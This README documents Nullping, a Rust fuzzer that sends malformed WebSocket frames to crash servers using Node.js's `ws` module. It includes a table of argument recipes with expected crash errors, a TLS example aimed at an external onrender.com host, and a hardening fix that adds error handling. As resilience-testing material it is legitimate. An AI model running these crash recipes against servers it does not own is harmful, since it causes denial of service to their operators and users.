## Nullping

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-1.89+-orange.svg)](https://www.rust-lang.org/)

> [!CAUTION]
> 
> This tool is for **security testing and educational purposes only**. Misuse may:
> - Cause denial of service
> - Violate terms of service
> - Have legal consequences
> 
> Only test against systems you own or have explicit permission to test.

A rust-based WebSocket frame fuzzer for testing server resilience against malformed frames.

The program constructs and sends malformed WebSocket frames to identify vulnerabilities in WebSocket server implementations, particularly targeting the popular Node.js `ws` module and other servers that might crash when processing invalid frames.

![2025-12-05 22-26-34(1)](https://github.com/user-attachments/assets/7b8553b0-76a2-462e-a26e-fe19be052cfe)

## Prerequisites

- Rust 1.89+
- Cargo 1.89+

## Installation

### From source

Build nullping with cargo (or rustc)

```bash
git clone https://github.com/pulsarf/Nullping
cd Nullping
cargo build
cargo install --path .
nullping-rs --help
```

### From releases

Head over to the [releases](https://github.com/pulsarf/Nullping/releases) and download the latest version binary/installer.

## Quick start

Start a test server (or the one from examples folder):

```js
const WebSocket = require('ws');
const wss = new WebSocket.Server({ 
    port: 10000
});
wss.on('connection', (ws) => {
  console.log('Client connected');
  ws.on('message', (message) => console.log('Received:', message));
});
```

Run a basic test:

```
./nullping-rs --opcode 69 --address localhost --port 10000
```

## Usage

### Basic syntax

nullping-rs [OPTIONS] --address <TARGET> --port <PORT> --protocol <ws|wss> ...

### Common test scenarios

The program allows you to construct a WebSocket frame (specifically, a malformed one) almost effortlessly, and send it to a ws/wss server.

However, it doesn't guarantee crashing the server, because **patching it temporarily is as easy as properly handling the error listener, and adding a try-catch block**.

You can use this table to make a quick test of your server against the exploit

| Attack type | Arguments | Explanation |
| -------- | ------| --------|
| RSV1 bit set | --rsv1 --mask --opcode 1 | WS asserts that none of reserved bits was set |
| All RSV bits set | --rsv1 --rsv2 --rsv3 --opcode 1 --mask | WS asserts that none of reserved bits was set |
| Payload oversize | --fin --opcode 9 --len 126 --extended-length 256 --payload $(cat zero_bytes.txt) | Note: zero_bytes.txt must have 256 zeroes, separated with a comma. WS with crash the server with "invalid payload length 126" |
| Mask unset | --opcode 8 --len 0 | Self explanatory. |
| Usage of reserved opcode | --opcode 15 --len 0 | WS will crash with "Invalid opcode" |
| Weird handling | --opcode 1 --mask --len 0 --key 255,255,255,255 --payload 255,255,255,255,255,255 --fin | WS will crash with error "Invalid opcode 0" |
| Missing extended length bytes | --fin --opcode 2  --len 126 | Self explanatory. |
| Missing extended length bytes | --fin --opcode 2  --len 127 | Self explanatory. |
| FIN with invalid status code | --fin --opcode 8 --mask --key 67,67,67,67 --len 4 --payload 3,233,0,0 | Shouldn't crash the server in theory, but stays here for clarity |
| Pure aura encoding | --fin --opcode 2 --len 126 --extended-length 5 --payload 255,255,255,255,255 |

### TLS/SSL Support

For WSS servers, enable the `--use-tungstenite` option:

```
nullping-rs --use-tungstenite --protocol wss --address mohmohx.onrender.com --port 443
```

## Hardening your server against exploits

The absence of `error` event handling is what makes this exploit possible.

Temporary mitigation for `ws` servers:

```javascript
(class Server {
  static PORT = 10000;

  static start() {
    new this();
  }

  server = new WebSocket.Server({
    port: Server.PORT,
  });

  constructor() {
    this.server.on("connection", (ws) => {
      console.log("Client connected");

      ws.on("message", this.#onMessage.bind(this));
      ws.on("error", this.#onError.bind(this)); // <-- handle error event here
    });

    this.server.on("listening", () => {
      console.log(`Running at port ${Server.PORT}`);
    });
  }

  #onMessage(message) {
    console.log("Received:", message);
  }

  #onError(error) {
    console.error(error);
  }
}).start();
```

## Contributing

This project is considered feature complete. No further feature development is planned, but:

- Security vulnerability reports are welcome

- Documentation improvements accepted

-  Bug fixes for critical issues

-  Refactors and code cleanups are accepted

## Acknowledgements

- Node.js ws module [source code](https://github.com/websockets/ws)
- @Murka007 for inspiration and research collaboration
- Rust tungstenite community

## License

[MIT](https://choosealicense.com/licenses/mit/)
